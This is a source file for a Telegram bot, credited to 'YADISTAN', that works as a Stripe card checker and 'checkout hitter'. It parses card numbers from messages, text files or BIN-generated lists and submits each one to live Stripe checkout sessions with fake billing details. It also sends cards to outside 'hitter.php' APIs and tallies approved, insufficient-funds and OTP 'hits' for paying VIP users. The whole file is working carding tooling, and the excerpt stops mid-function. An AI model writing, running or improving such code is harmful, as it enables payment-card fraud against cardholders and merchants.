            header = f"<b>⚡ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n{status_text}\n"
            header += f"━━━━━━━━━━━━━━━━━━━━\n"
            header += f"📊 {checked}/{total} | ✅ {live} | 💰 {insufficient} | ❌ {dead}\n"
            header += f"━━━━━━━━━━━━━━━━━━━━\n"
            body = "\n".join(results_lines[-15:])
            footer = "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"
            return header + body + footer
        
        for cc in cards:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=msg.message_id,
                        text=build_mass_message("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗")
                    )
                except:
                    pass
                return
            
            cc = cc.strip()
            
            start_time = time.time()
            result = stripe_charge(cc, proxy)
            execution_time = time.time() - start_time
            checked += 1
            
            if "Charge !!" in result:
                status_emoji = "✅"
                live += 1
            elif "Insufficient Funds" in result or "Insufficient" in result:
                status_emoji = "💰"
                insufficient += 1
            else:
                status_emoji = "❌"
                dead += 1
            
            cc_short = cc
            results_lines.append(f"{status_emoji} <code>{cc_short}</code> → {result}")
            
            try:
                stop_kb = types.InlineKeyboardMarkup()
                stop_btn = types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop')
                stop_kb.add(stop_btn)
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=msg.message_id,
                    text=build_mass_message("⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."),
                    reply_markup=stop_kb
                )
            except:
                pass
        
        try:
            minux_keyboard = types.InlineKeyboardMarkup()
            minux_button = types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan")
            minux_keyboard.add(minux_button)
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=build_mass_message("✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"),
                reply_markup=minux_keyboard
            )
        except:
            pass
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== Stripe Checkout Hitter (Pure Python) ==================
_STRIPE_UA      = 'stripe.js/90ba939846; stripe-js-v3/90ba939846; checkout'
_STRIPE_VERSION = '90ba939846'
_XOR_KEY        = 5

def _parse_checkout_url(checkout_url):
    """Extract sessionId and publicKey from a Stripe checkout URL."""
    import base64, re as _re
    try:
        checkout_url = requests.utils.unquote(checkout_url)
    except Exception:
        pass
    session_match = _re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', checkout_url)
    session_id = session_match.group(0) if session_match else None

    public_key = None
    site       = None
    frag_idx   = checkout_url.find('#')
    if frag_idx != -1:
        try:
            fragment = checkout_url[frag_idx + 1:]
            decoded  = requests.utils.unquote(fragment)
            raw      = base64.b64decode(decoded + '==')
            xored    = ''.join(chr(b ^ _XOR_KEY) for b in raw)
            pk_match = _re.search(r'pk_(?:live|test)_[A-Za-z0-9_\-]+', xored)
            if pk_match:
                public_key = pk_match.group(0)
            site_match = _re.search(r'https?://[^\s"\']+', xored)
            if site_match:
                site = site_match.group(0)
        except Exception:
            pass
    return session_id, public_key, site

def _stripe_post(url, payload, headers=None):
    """POST form-encoded data to Stripe and return (status_code, json_dict)."""
    hdrs = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent':   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Origin':       'https://checkout.stripe.com',
        'Referer':      'https://checkout.stripe.com/',
        'Accept':       'application/json',
    }
    if headers:
        hdrs.update(headers)
    try:
        r = requests.post(url, data=payload, headers=hdrs, timeout=30)
        return r.status_code, r.json()
    except Exception as e:
        return 0, {"error": {"message": str(e)}}

def _fetch_checkout_info(session_id, public_key):
    """Init checkout session and return parsed info dict."""
    payload = {
        'key':              public_key,
        'eid':              'NA',
        'browser_locale':   'en-US',
        'browser_timezone': 'UTC',
        'redirect_type':    'url',
    }
    sc, d = _stripe_post(
        f'https://api.stripe.com/v1/payment_pages/{requests.utils.quote(session_id, safe="")}/init',
        payload
    )
    if sc != 200:
        err_msg = (d.get('error') or {}).get('message', f'HTTP {sc}')
        return {'_error': err_msg}

    # Amount — try every known field where Stripe stores it
    invoice   = d.get('invoice') or {}
    amount = (
        invoice.get('total')
        or invoice.get('amount_due')
        or invoice.get('amount_remaining')
        or d.get('amount_total')
        or d.get('amount_subtotal')
        or d.get('amount')
        or 0
    )
    currency  = (d.get('currency') or invoice.get('currency') or 'usd').upper()
    email     = d.get('customer_email', '') or ''
    checksum  = d.get('init_checksum', '') or ''
    config_id = d.get('config_id') or d.get('checkout_config_id')

    # Merchant name
    acct = d.get('account_settings') or {}
    merchant = acct.get('display_name') or acct.get('name') or 'Stripe'

    amount_str = f"{amount / 100:.2f} {currency}" if amount else "N/A"
    return {
        'amount_raw': amount,
        'amount':     amount_str,
        'currency':   currency,
        'email':      email or 'test@example.com',
        'checksum':   checksum,
        'config_id':  config_id,
        'merchant':   merchant,
        '_raw':       d,   # keep raw for debugging
    }

def ext_stripe_check(checkout_url, ccx):
    """Pure-Python Stripe checkout hitter — no Node.js required."""
    import time as _time, re as _re, random as _random
    t0 = _time.time()

    def _elapsed():
        return f"{round(_time.time() - t0, 2)}s"

    def _err(msg, **kw):
        return {"status": "error", "message": msg,
                "merchant": kw.get("merchant", "N/A"),
                "amount":   kw.get("amount",   "N/A"),
                "time":     _elapsed(), "url": ""}

    # ── Parse card ──────────────────────────────────────────────
    parts = _re.split(r'[\|/\s]+', ccx.strip())
    if len(parts) < 4:
        return _err("Invalid card format — use CC|MM|YY|CVV")
    cc_num, cc_mm, cc_yy, cc_cvv = parts[0], parts[1], parts[2], parts[3].strip()
    if len(cc_yy) == 4:
        cc_yy = cc_yy[2:]

    # ── Parse checkout URL ──────────────────────────────────────
    session_id, public_key, site = _parse_checkout_url(checkout_url)
    if not session_id:
        return _err("Could not extract session ID from checkout URL")
    if not public_key:
        return _err("Could not extract public key from checkout URL")

    # ── Fetch checkout info ─────────────────────────────────────
    info = _fetch_checkout_info(session_id, public_key)
    if not info:
        return _err("Failed to init checkout session")
    if '_error' in info:
        return _err(info['_error'])

    merchant   = info['merchant']
    amount_str = info['amount']
    email      = info['email']
    checksum   = info['checksum']
    config_id  = info['config_id']
    amount_raw = info['amount_raw']

    # ── Create payment method ───────────────────────────────────
    pm_payload = {
        'type':                       'card',
        'card[number]':               cc_num,
        'card[cvc]':                  cc_cvv,
        'card[exp_month]':            cc_mm,
        'card[exp_year]':             cc_yy,
        'billing_details[name]':      'Test User',
        'billing_details[email]':     email,
        'billing_details[address][country]':     'US',
        'billing_details[address][line1]':        '1501 Gaylord Trail',
        'billing_details[address][city]':         'Grapevine',
        'billing_details[address][state]':        'TX',
        'billing_details[address][postal_code]':  '76051',
        'guid':                       'NA',
        'muid':                       'NA',
        'sid':                        'NA',
        'key':                        public_key,
        'payment_user_agent':         _STRIPE_UA,
        'client_attribution_metadata[client_session_id]':              session_id,
        'client_attribution_metadata[merchant_integration_source]':    'checkout',
        'client_attribution_metadata[merchant_integration_version]':   'hosted_checkout',
        'client_attribution_metadata[payment_method_selection_flow]':  'automatic',
    }
    if config_id:
        pm_payload['client_attribution_metadata[checkout_config_id]'] = config_id

    pm_sc, pm_d = _stripe_post('https://api.stripe.com/v1/payment_methods', pm_payload)

    if pm_sc != 200 or 'id' not in pm_d:
        err_obj  = pm_d.get('error', {})
        err_msg  = err_obj.get('message', 'Card tokenization failed')
        err_code = err_obj.get('code', '')
        if 'insufficient' in err_code or 'insufficient' in err_msg.lower():
            status = 'insufficient_funds'
        elif 'invalid' in err_msg.lower() or 'incorrect' in err_msg.lower():
            status = 'declined'
        else:
            status = 'declined'
        return {"status": status, "message": err_msg,
                "merchant": merchant, "amount": amount_str,
                "time": _elapsed(), "url": ""}

    pm_id = pm_d['id']

    # ── Confirm payment ─────────────────────────────────────────
    cf_payload = {
        'eid':                          'NA',
        'payment_method':               pm_id,
        'consent[terms_of_service]':    'accepted',
        'expected_payment_method_type': 'card',
        'guid':                         'NA',
        'muid':                         'NA',
        'sid':                          'NA',
        'key':                          public_key,
        'version':                      _STRIPE_VERSION,
        'init_checksum':                checksum,
        'passive_captcha_token':        '',
        'client_attribution_metadata[client_session_id]':              session_id,
        'client_attribution_metadata[merchant_integration_source]':    'checkout',
        'client_attribution_metadata[merchant_integration_version]':   'hosted_checkout',
        'client_attribution_metadata[payment_method_selection_flow]':  'automatic',
    }
    if config_id:
        cf_payload['client_attribution_metadata[checkout_config_id]'] = config_id
    # Only send expected_amount when known — sending 0 causes "Your order has been updated" error
    if amount_raw and amount_raw > 0:
        cf_payload['expected_amount'] = str(amount_raw)

    cf_sc, cf_d = _stripe_post(
        f'https://api.stripe.com/v1/payment_pages/{requests.utils.quote(session_id, safe="")}/confirm',
        cf_payload
    )

    # ── Parse result ────────────────────────────────────────────
    pi     = cf_d.get('payment_intent', {}) or {}
    pi_st  = pi.get('status', '')
    err_o  = cf_d.get('error') or pi.get('last_payment_error') or {}
    if isinstance(err_o, str):
        err_o = {}

    success_url = cf_d.get('success_url') or cf_d.get('return_url') or ''

    if cf_d.get('status') == 'complete' or pi_st == 'succeeded':
        status  = 'approved'
        message = 'Payment Approved'
    elif pi_st == 'requires_action' and pi.get('next_action'):
        status  = '3ds'
        message = '3DS Required'
    elif pi_st == 'requires_payment_method' or err_o:
        code    = err_o.get('code', err_o.get('decline_code', ''))
        emsg    = err_o.get('message', 'Card Declined')
        if 'insufficient' in code or 'insufficient' in emsg.lower():
            status = 'insufficient_funds'
        else:
            status = 'declined'
        message = emsg
    else:
        e2   = cf_d.get('error', {}) or {}
        emsg = e2.get('message', f'Unknown ({cf_sc})')
        code = e2.get('code', '')
        if 'insufficient' in code or 'insufficient' in emsg.lower():
            status = 'insufficient_funds'
        else:
            status = 'declined'
        message = emsg

    return {
        "status":   status,
        "message":  message,
        "merchant": merchant,
        "amount":   amount_str,
        "time":     _elapsed(),
        "url":      success_url,
    }

def ext_stripe_api_alive():
    """Always True — pure Python implementation, no external server needed."""
    return True

# /co external API — gold-newt hostinger
_CO_EXT_API  = "https://gold-newt-367030.hostingersite.com/Api/stripe.php"
_CO_EXT_KEY  = os.environ.get("CO_EXT_KEY", "TRIAL1DAY")

# /h hitter API — gold-newt hostinger (hitter.php — JSON response)
_H_API       = "https://gold-newt-367030.hostingersite.com/Api/hitter.php"
_H_KEY       = os.environ.get("H_KEY", "TRIALAPI")

def _h_call(checkout_url, ccx):
    """Call hitter.php — returns dict with status/message/merchant/amount/time/raw keys."""
    try:
        r = requests.get(
            _H_API,
            params={"key": _H_KEY, "co": checkout_url, "cc": ccx},
            timeout=40
        )
        raw = r.text.strip()
    except Exception as e:
        return {"status": "error", "message": str(e)[:80], "raw": ""}

    # Try JSON parse first (hitter.php returns JSON)
    try:
        d       = r.json()
        raw_st  = d.get("status", "").lower()
        message = d.get("message", raw)
        merchant= d.get("merchant", "N/A")
        amount  = d.get("amount",   "N/A")
        elapsed = d.get("time",     "N/A")
        msg_low = message.lower()

        if raw_st in ("approved", "charged", "success", "live"):
            status = "approved"
        elif "insufficient" in raw_st or "insufficient" in msg_low:
            status = "insufficient_funds"
        elif (any(k in raw_st  for k in ("3d", "otp", "authenticate")) or
              any(k in msg_low for k in ("3d", "otp", "authenticate", "requires_action", "authentication"))):
            status = "3ds"
        elif raw_st in ("unauthorized", "invalid key", "key_error") or "unauthorized" in msg_low:
            status = "key_error"
        else:
            status = "declined"

        return {"status": status, "message": message,
                "merchant": merchant, "amount": amount,
                "time": elapsed, "raw": raw}
    except Exception:
        pass

    # Fallback: plain-text keyword detection
    raw_low = raw.lower()
    if any(k in raw_low for k in ("approved", "charged", "success", "charge ok", "live")):
        status = "approved"
    elif any(k in raw_low for k in ("insufficient",)):
        status = "insufficient_funds"
    elif any(k in raw_low for k in ("3d", "otp", "authenticate", "requires_action")):
        status = "3ds"
    elif any(k in raw_low for k in ("unauthorized", "invalid", "bad key")):
        status = "key_error"
    else:
        status = "declined"

    return {"status": status, "message": raw, "merchant": "N/A",
            "amount": "N/A", "time": "N/A", "raw": raw}

def _h_word(d):
    s = d.get("status", "")
    if s == "approved":         return "Approve"
    if s == "insufficient_funds": return "Funds"
    if s == "3ds":              return "Otp"
    if s == "key_error":        return "KeyError"
    return "Decline"

def _h_emoji(d):
    s = d.get("status", "")
    if s == "approved":           return "✅"
    if s == "insufficient_funds": return "💰"
    if s == "3ds":                return "⚠️"
    if s == "key_error":          return "🔑"
    return "❌"

def _co_ext_call(checkout_url, ccx):
    """
    Call external API for /co — falls back to pure-Python ext_stripe_check if unavailable.
    Returns same dict format as ext_stripe_check.
    """
    import time as _t
    t0 = _t.time()
    def _elapsed():
        return f"{round(_t.time() - t0, 2)}s"
    try:
        r = requests.get(
            _CO_EXT_API,
            params={"key": _CO_EXT_KEY, "co": checkout_url, "cc": ccx},
            timeout=40
        )
        if r.status_code == 200 and "Unauthorized" not in r.text:
            d        = r.json()
            raw_st   = d.get("status", "").lower()
            message  = d.get("message", "Unknown")
            merchant = d.get("merchant", "N/A")
            amount   = d.get("amount",   "N/A")
            elapsed  = d.get("time",     _elapsed())

            msg_low = message.lower()
            if raw_st in ("approved", "charged", "success"):
                status = "approved"
            elif "insufficient" in raw_st or "insufficient" in msg_low:
                status = "insufficient_funds"
            elif (any(k in raw_st  for k in ("3d", "action", "authenticate", "otp")) or
                  any(k in msg_low for k in ("3d", "authenticate", "otp", "requires_action",
                                              "authentication", "secure"))):
                status = "3ds"
            else:
                status = "declined"

            return {"status": status, "message": message,
                    "merchant": merchant, "amount": amount,
                    "time": elapsed, "url": ""}
    except Exception:
        pass  # fall through to pure-Python

    # Fallback → pure Python
    return ext_stripe_check(checkout_url, ccx)

# ── Shared UI helpers ────────────────────────────────────────────
_CC_RE = re.compile(r'(\d{13,19})[|/ ](\d{1,2})[|/ ](\d{2,4})[|/ ](\d{3,4})')

def _extract_cc(line: str):
    """Extract CC in num|mm|yy|cvv format from a raw/messy line. Returns None if not found."""
    m = _CC_RE.search(line)
    if not m:
        return None
    num, mm, yy, cvv = m.group(1), m.group(2), m.group(3), m.group(4)
    return f"{num}|{mm}|{yy}|{cvv}"

def _flag(code):
    """Country code (e.g. 'US') → flag emoji 🇺🇸"""
    code = (code or '').upper().strip()
    if len(code) != 2 or not code.isalpha():
        return ''
    return chr(ord(code[0]) + 127397) + chr(ord(code[1]) + 127397)

def _prog_bar(done, total, width=10):
    """Progress bar: ▓▓▓▓▓░░░░░"""
    if total == 0:
        return '░' * width
    filled = round(width * done / total)
    return '▓' * filled + '░' * (width - filled)

def _fmt_result_line(status_emoji, cc, result):
    """Compact single result line for BIN/multi/txt modes — one-word status."""
    st  = result.get('status', '').lower()
    msg = result.get('message', '').lower()

    if st == 'approved':
        word = 'Approve'
    elif st == '3ds' or any(k in msg for k in ('3d','otp','authenticate','authentication')):
        word = 'Otp'
    elif st == 'insufficient_funds' or 'insufficient' in msg:
        word = 'Funds'
    else:
        word = 'Decline'

    return f"{status_emoji} <b>{word}</b>  ❯  <code>{cc}</code>"

# ================== /co — External API Checkout (Card OR BIN mode) ==================
@bot.message_handler(commands=["co"])
def ext_checkout_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'

        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return

        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>")
            return

        # ── Early API health check ──
        # ext_stripe_api_alive() always True — pure Python implementation

        usage_msg = (
            "<b>🌐 <u>𝗘𝘅𝘁 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁</u>\n\n"
            "━━━━━━━━━━━━━━━━\n"
            "📌 <b>Card Mode:</b>\n"
            "<code>/co https://checkout.stripe.com/xxx\n"
            "4111111111111111|12|26|123</code>\n\n"
            "📌 <b>BIN Mode (auto-gen):</b>\n"
            "<code>/co https://checkout.stripe.com/xxx\n"
            "411111 30</code>\n"
            "<i>(BIN amount — default 15, max 100)</i>\n"
            "━━━━━━━━━━━━━━━━\n"
            "✅ <b>Supported Links:</b>\n"
            "• <code>checkout.stripe.com</code>\n"
            "• <code>buy.stripe.com</code>\n"
            "• Any custom domain checkout\n"
            "━━━━━━━━━━━━━━━━</b>"
        )

        def _ext_status(d):
            s = d.get("status", "").lower()
            if s == "approved":
                return "✅"
            elif s == "insufficient_funds":
                return "💰"
            elif s == "3ds":
                return "⚠️"
            else:
                return "❌"

        def _ext_line(d):
            """One-word status label for mass/BIN/txt live listings."""
            s   = d.get("status", "").lower()
            msg = d.get("message", "").lower()
            if s == "approved":
                return "Approve"
            elif s == "3ds" or any(k in msg for k in ("3d", "otp", "authenticate", "authentication")):
                return "Otp"
            elif s == "insufficient_funds" or "insufficient" in msg:
                return "Funds"
            else:
                return "Decline"

        # ====== TXT FILE REPLY MODE ======
        # User replied to a .txt document with: /co <checkout_url>
        replied = message.reply_to_message
        if (replied and replied.document
                and replied.document.file_name
                and replied.document.file_name.lower().endswith('.txt')):

            # Extract checkout URL from the command text
            txt_parts = message.text.split()
            if len(txt_parts) < 2:
                bot.reply_to(message,
                    "<b>❌ Checkout URL nahi mila.\n"
                    "Usage: <code>/co https://checkout.stripe.com/xxx</code> → (txt file pe reply karein)</b>",
                    parse_mode='HTML')
                return
            checkout_url = txt_parts[1].strip()
            if not checkout_url.startswith('http'):
                bot.reply_to(message,
                    "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗹𝗶𝗻𝗸.\n\n✅ Stripe checkout link paste karein.</b>",
                    parse_mode='HTML')
                return

            # Download and parse CCs from the txt file
            try:
                file_info = bot.get_file(replied.document.file_id)
                downloaded = bot.download_file(file_info.file_path)
                raw_text = downloaded.decode('utf-8', errors='ignore')
            except Exception as e:
                bot.reply_to(message, f"<b>❌ File download failed: {str(e)[:80]}</b>", parse_mode='HTML')
                return

            CC_RE = re.compile(r'\d{15,19}[|: \/]\d{1,2}[|: \/]\d{2,4}[|: \/]\d{3,4}')
            card_lines = [m.group().replace(' ', '|').replace('/', '|').replace(':', '|')
                          for m in CC_RE.finditer(raw_text)]

            if not card_lines:
                bot.reply_to(message,
                    "<b>❌ File mein koi valid CC nahi mila.\n"
                    "<i>(Format: 4111111111111111|12|26|123)</i></b>",
                    parse_mode='HTML')
                return

            total_txt = len(card_lines)
            _TXT_MAX = 999999
            if total_txt > _TXT_MAX:
                bot.reply_to(message,
                    f"<b>⚠️ File mein {total_txt} cards hain — max {_TXT_MAX} allowed.\n"
                    f"Pehle {_TXT_MAX} cards check honge.</b>", parse_mode='HTML')
                card_lines = card_lines[:_TXT_MAX]
                total_txt = _TXT_MAX

            # --- Route to multi-card checker ---
            live = dead = insufficient = checked = 0
            hits = []
            results_lines = []
            total = total_txt

            stop_kb = types.InlineKeyboardMarkup()
            stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
            try:
                stopuser[f'{id}']['status'] = 'start'
            except:
                stopuser[f'{id}'] = {'status': 'start'}

            log_command(message, query_type='gateway', gateway='ext_stripe_txt')
            msg = bot.reply_to(message,
                f"<b>📄 𝗧𝘅𝘁 𝗙𝗶𝗹𝗲 → 𝗘𝘅𝘁 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📂 𝗙𝗶𝗹𝗲: {replied.document.file_name}\n"
                f"📋 𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴...</b>", reply_markup=stop_kb)

            def build_txt_msg(status_text="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
                header = (f"<b>📄 𝗧𝘅𝘁 𝗙𝗶𝗹𝗲 → 𝗘𝘅𝘁 𝗦𝘁𝗿𝗶𝗽𝗲 | {status_text}\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n"
                          f"📂 {replied.document.file_name}\n"
                          f"📊 {checked}/{total} | ✅ {live} | 💰 {insufficient} | ❌ {dead}\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n")
                body = "\n".join(results_lines[-10:])
                footer_hits = ""
                if hits:
                    _hlabels = {"✅": "Hit (Paid)", "💰": "Hit (Insufficient Funds)", "⚠️": "Hit (OTP Required)"}
                    hits_lines = "".join(
                        f"\n<b>{_hlabels.get(em,'Hit')}</b>\n"
                        f"<code>{cc}</code>\n"
                        f"<b>Site:</b> {res.get('merchant','N/A')}\n"
                        f"<b>Amount:</b> {res.get('amount','N/A')}\n"
                        f"<b>Message:</b> {res.get('message','N/A')}\n"
                        for cc, res, em in hits[-8:]
                    )
                    footer_hits = f"\n━━━━━━━━━━━━━━━━━━━━\n🎯 𝗛𝗜𝗧𝗦 ({len(hits)}):" + hits_lines
                full = header + body + footer_hits + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] Bot by @yadistan</b>"
                # Telegram hard limit guard
                if len(full) > 4000:
                    full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n[⌤] Bot by @yadistan</b>"
                return full

            for cc in card_lines:
                if stopuser.get(f'{id}', {}).get('status') == 'stop':
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_txt_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"), parse_mode='HTML')
                    except:
                        pass
                    return

                cc = cc.strip()
                result = _co_ext_call(checkout_url, cc)
                checked += 1
                log_card_check(id, cc, 'ext_stripe_txt',
                               f"{result.get('status')} | {result.get('message')}")

                status_emoji = _ext_status(result)
                if status_emoji == "✅":
                    live += 1
                    hits.append((cc, result, status_emoji))
                elif status_emoji == "💰":
                    insufficient += 1
                    hits.append((cc, result, status_emoji))
                elif status_emoji == "⚠️":
                    live += 1
                    hits.append((cc, result, status_emoji))   # 3DS bhi hit hai
                else:
                    dead += 1

                results_lines.append(
                    f"{status_emoji} <b>{_ext_line(result)}</b>  ❯  <code>{cc}</code>"
                )

                # Update every 5 cards (not 3) to avoid Telegram flood limit
                if checked % 5 == 0 or checked == total:
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_txt_msg(), parse_mode='HTML',
                                              reply_markup=stop_kb)
                        time.sleep(0.5)   # flood protection
                    except Exception:
                        time.sleep(1)     # if edit fails, wait longer

            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_txt_msg("✅ 𝗗𝗢𝗡𝗘"), parse_mode='HTML')
            except:
                pass
            return
        # ====== END TXT FILE REPLY MODE ======

        # ====== REPLIED TEXT MESSAGE CC MODE ======
        # User replied to a /gen (or any CC text) message with: /co <url>
        if (replied
                and not (replied.document
                         and replied.document.file_name
                         and replied.document.file_name.lower().endswith('.txt'))):
            cmd_parts = message.text.split()
            if len(cmd_parts) >= 2 and cmd_parts[1].startswith('http'):
                replied_text = replied.text or replied.caption or ""
                reply_cards = []
                seen_r = set()
                for _rl in replied_text.splitlines():
                    _cc = _extract_cc(_rl.strip())
                    if _cc and _cc not in seen_r:
                        reply_cards.append(_cc)
                        seen_r.add(_cc)

                if reply_cards:
                    checkout_url = cmd_parts[1]
                    card_lines   = reply_cards
                    total        = len(card_lines)

                    live = dead = insufficient = checked = 0
                    hits = []
                    results_lines = []

                    stop_kb = types.InlineKeyboardMarkup()
                    stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                    try:
                        stopuser[f'{id}']['status'] = 'start'
                    except:
                        stopuser[f'{id}'] = {'status': 'start'}

                    log_command(message, query_type='gateway', gateway='ext_stripe_txt')
                    src_name = f"Gen Message ({total} cards)"
                    msg = bot.reply_to(message,
                        f"<b>📋 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 → 𝗘𝘅𝘁 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"📋 𝗦𝗼𝘂𝗿𝗰𝗲: {src_name}\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"⏳ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴...</b>",
                        reply_markup=stop_kb, parse_mode='HTML')

                    def build_msg_msg(status_text="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
                        header = (f"<b>📋 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 → 𝗘𝘅𝘁 𝗦𝘁𝗿𝗶𝗽𝗲 | {status_text}\n"
                                  f"━━━━━━━━━━━━━━━━━━━━\n"
                                  f"📋 {src_name}\n"
                                  f"📊 {checked}/{total} | ✅ {live} | 💰 {insufficient} | ❌ {dead}\n"
                                  f"━━━━━━━━━━━━━━━━━━━━\n")
                        body = "\n".join(results_lines[-10:])
                        footer_hits = ""
                        if hits:
                            _hlabels = {"✅": "Hit (Paid)", "💰": "Hit (Insufficient Funds)", "⚠️": "Hit (OTP Required)"}
                            hits_lines = "".join(
                                f"\n<b>{_hlabels.get(em,'Hit')}</b>\n"
                                f"<code>{cc}</code>\n"
                                f"<b>Site:</b> {res.get('merchant','N/A')}\n"
                                f"<b>Amount:</b> {res.get('amount','N/A')}\n"
                                f"<b>Message:</b> {res.get('message','N/A')}\n"
                                for cc, res, em in hits[-8:]
                            )
                            footer_hits = f"\n━━━━━━━━━━━━━━━━━━━━\n🎯 𝗛𝗜𝗧𝗦 ({len(hits)}):" + hits_lines
                        full = header + body + footer_hits + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] Bot by @yadistan</b>"
                        if len(full) > 4000:
                            full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n[⌤] Bot by @yadistan</b>"
                        return full

                    for cc in card_lines:
                        if stopuser.get(f'{id}', {}).get('status') == 'stop':
                            try:
                                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                                      text=build_msg_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"), parse_mode='HTML')
                            except:
                                pass
                            return

                        cc = cc.strip()
                        result = _co_ext_call(checkout_url, cc)
                        checked += 1
                        log_card_check(id, cc, 'ext_stripe_txt',
                                       f"{result.get('status')} | {result.get('message')}")

                        status_emoji = _ext_status(result)
                        if status_emoji == "✅":
                            live += 1
                            hits.append((cc, result, status_emoji))
                        elif status_emoji == "💰":
                            insufficient += 1
                            hits.append((cc, result, status_emoji))
                        elif status_emoji == "⚠️":
                            live += 1
                            hits.append((cc, result, status_emoji))
                        else:
                            dead += 1

                        results_lines.append(
                            f"{status_emoji} <b>{_ext_line(result)}</b>  ❯  <code>{cc}</code>"
                        )

                        if checked % 5 == 0 or checked == total:
                            try:
                                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                                      text=build_msg_msg(), parse_mode='HTML',
                                                      reply_markup=stop_kb)
                                time.sleep(0.5)
                            except Exception:
                                time.sleep(1)

                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_msg_msg("✅ 𝗗𝗢𝗡𝗘"), parse_mode='HTML')
                    except:
                        pass
                    return
        # ====== END REPLIED TEXT MESSAGE CC MODE ======

        try:
            lines = message.text.split('\n')
            first_parts = lines[0].split(' ', 1)
            if len(first_parts) < 2:
                raise IndexError

            first_line_rest = first_parts[1].strip()

            if len(lines) > 1:
                checkout_url = first_line_rest
                second_line = lines[1].strip()
            else:
                parts = first_line_rest.split()
                if len(parts) < 2:
                    raise IndexError
                checkout_url = parts[0]
                second_line = ' '.join(parts[1:])
        except (IndexError, ValueError):
            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        if not checkout_url.startswith('http'):
            bot.reply_to(message, "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗹𝗶𝗻𝗸.\n\n✅ Stripe checkout link paste karein.\n<i>(checkout.stripe.com, buy.stripe.com, ya koi bhi custom domain)</i></b>")
            return

        # --- Detect mode: BIN or Card ---
        first_token = second_line.split('|')[0].strip().split()[0]
        is_card_mode = (len(first_token) >= 13 and first_token.isdigit()) or (_extract_cc(second_line) is not None)

        # ====== CARD MODE ======
        if is_card_mode:
            _raw_lines = [l.strip() for l in lines[1:] if l.strip()] if len(lines) > 1 else [second_line]
            card_lines = []
            for _rl in _raw_lines:
                _cc = _extract_cc(_rl)
                if _cc:
                    card_lines.append(_cc)
            if not card_lines:
                bot.reply_to(message, usage_msg, parse_mode='HTML')
                return

            # --- Single card ---
            if len(card_lines) == 1:
                card = card_lines[0]
                bin_num = card.replace('|', '')[:6]
                bin_info, bank, country, country_code = get_bin_info(bin_num)

